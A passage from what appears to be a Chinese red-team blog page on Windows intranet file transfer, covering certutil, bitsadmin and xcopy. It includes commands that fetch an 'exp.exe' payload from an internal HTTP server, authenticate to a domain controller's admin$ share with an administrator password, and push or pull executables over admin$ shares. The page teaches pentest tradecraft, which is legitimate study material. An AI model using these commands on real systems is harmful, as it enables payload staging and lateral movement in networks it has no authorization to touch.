url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>默认下载为bin文件。但是不影响在命令行下使用。</p>
+<p>certutil还自带base64编码解码功能</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> certutil -encode c:\downfile.vbs downfile.bat 
+</span></span><span class="line"><span class="cl"> certutil -decode c:\downfile.bat downfile.txt</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="五bitsadmin" class="heading-element"><span>五、bitsadmin</span>
+  <a href="#%e4%ba%94bitsadmin" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度。</p>
+<p>具体相关参数参见 官方文档：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">USAGE: BITSADMIN [/RAWRETURN] [/WRAP | /NOWRAP] command 
+</span></span><span class="line"><span class="cl">The following commands are available:  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/?                Prints this help 
+</span></span><span class="line"><span class="cl">/UTIL  /?         打印实用程序命令列表 
+</span></span><span class="line"><span class="cl">/PEERCACHING /?   打印管理缓存的命令列表 
+</span></span><span class="line"><span class="cl">/CACHE /?         打印缓存管理命令 
+</span></span><span class="line"><span class="cl">/PEERS  /?        打印管道peer管理命令  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/LIST   [/ALLUSERS] [/VERBOSE]     打印任务列表 
+</span></span><span class="line"><span class="cl">/MONITOR [/ALLUSERS] [/REFRESH sec] 监控复制管理器 
+</span></span><span class="line"><span class="cl">/RESET   [/ALLUSERS]                删除所有任务  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/TRANSFER &lt;job name&gt; [type] [/PRIORITY priority] [/ACLFLAGS flags]
+</span></span><span class="line"><span class="cl">					remote_url local_name          传输一个或多个文件.
+</span></span><span class="line"><span class="cl">          [type] 为/DOWNLOAD或/UPLOAD; 默认为下载 
+</span></span><span class="line"><span class="cl">          可以指定多个 URL/文件对。local_name 只支持 绝对路径</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bitsadmin /transfer <span class="m">123</span> http://192.168.111.1:8080/exp.exe C:<span class="se">\U</span>sers<span class="se">\1</span>day<span class="se">\D</span>esktop<span class="se">\e</span>xp.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">net use <span class="se">\\</span>DC<span class="se">\a</span>dmin$ /u:<span class="s2">&#34;administrator&#34;</span> <span class="s2">&#34; 1qaz@WSX&#34;</span>
+</span></span><span class="line"><span class="cl">bitsadmin /TRANSFER /DOWNLOAD <span class="se">\\</span>WEB<span class="se">\a</span>dmin$<span class="se">\t</span>emp<span class="se">\t</span>.exe C:<span class="se">\w</span>indows<span class="se">\t</span>emp<span class="se">\t</span>.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bitsadmin /TRANSFER /UPLOAD c:<span class="se">\w</span>indows<span class="se">\t</span>emp<span class="se">\t</span>.exe <span class="se">\\</span>WEB<span class="se">\a</span>dmin$<span class="se">\t</span>emp<span class="se">\t</span>.exe</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640-20230220172700442.png" alt="图片" srcset="/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640-20230220172700442.png?size=small, /posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640-20230220172700442.png?size=medium 1.5x, /posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640-20230220172700442.png?size=large 2x" data-title="图片" style="--width: 958px;--aspect-ratio: 958 / 527;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自 动重试，在比较复杂的网络环境下，有着不错的性能。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">E:<span class="se">\&gt;</span>bitsadmin /rawreturn /transfer down <span class="s2">&#34;http://192.168.1.115/robots.txt&#34;</span> E:<span class="se">\P</span>DF<span class="se">\r</span>obots.txt
+</span></span><span class="line"><span class="cl">/RAWRETURN                     返回数据更适合解析</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要注意的是，bitsadmin要求服务器支持Range标头。如果需要下载过大的文件，需要提高优先级。配合上面的下载命令。再次执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bitsadmin /setpriority down foreground
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/SETPRIORITY    &lt;job&gt; &lt;priority&gt;    <span class="c1"># 设置工作优先级   </span>
+</span></span><span class="line"><span class="cl">		Priority usage choices:      
+</span></span><span class="line"><span class="cl">				FOREGROUND
+</span></span><span class="line"><span class="cl">        HIGH
+</span></span><span class="line"><span class="cl">        NORMAL
+</span></span><span class="line"><span class="cl">        LOW</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="六-xcopy" class="heading-element"><span>六 、Xcopy</span>
+  <a href="#%e5%85%ad-xcopy" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Windows 自带命令，复制文件和目录树</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 建立网络会话</span>
+</span></span><span class="line"><span class="cl">net use <span class="se">\\</span>DC<span class="se">\a</span>dmin$ /u:<span class="s2">&#34;administrator&#34;</span> <span class="s2">&#34;password&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 从本地推到远端</span>
+</span></span><span class="line"><span class="cl">xcopy /s /h /d /c /y C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\t</span>.exe <span class="se">\\</span>WEB<span class="se">\\</span>admin$<span class="se">\t</span>emp<span class="se">\ </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 从远端拉到本地</span>
+</span></span><span class="line"><span class="cl">xcopy /s /h /d /c /y <span class="se">\\</span>WEB<span class="se">\\</span>admin$<span class="se">\t</span>emp<span class="se">\t</span>.exe C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\ </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">参数讲解：
+</span></span><span class="line"><span class="cl">XCOPY <span class="nb">source</span> <span class="o">[</span>destination<span class="o">]</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">source</span>         指定要复制的文件。
+</span></span><span class="line"><span class="cl">	destination    指定新文件的位置和/或名称。
+</span></span><span class="line"><span class="cl">	/S             复制目录和子目录，不包括空目录。
+</span></span><span class="line"><span class="cl">	/H             也复制隐藏文件和系统文件。
+</span></span><span class="line"><span class="cl">	/D:m-d-y      复制在指定日期或指定日期以后更改的文件。如果没有提供日期，只复制那些源时间比目标时间新的文件。
+</span></span><span class="line"><span class="cl">	/C             即使有错误，也继续复制。
+</span></span><span class="line"><span class="cl">	/Y             取消提示以确认要覆盖现有目标文件。</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2021-11-13 17:25:01">更新于 2021-11-13&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/pentest/" class="post-tag" title="标签 - Pentest">Pentest</a><a href="/tags/redteam/" class="post-tag" title="标签 - RedTeam">RedTeam</a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag" title="标签 - 内网渗透">内网渗透</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/" class="post-nav-item" rel="prev" title="004-内网渗透 内网信息搜集脑图"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>004-内网渗透 内网信息搜集脑图</a><a href="/posts/hackthebox-legacy/" class="post-nav-item" rel="next" title="HTB靶机 Legacy WriteUp">HTB靶机 Legacy WriteUp<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
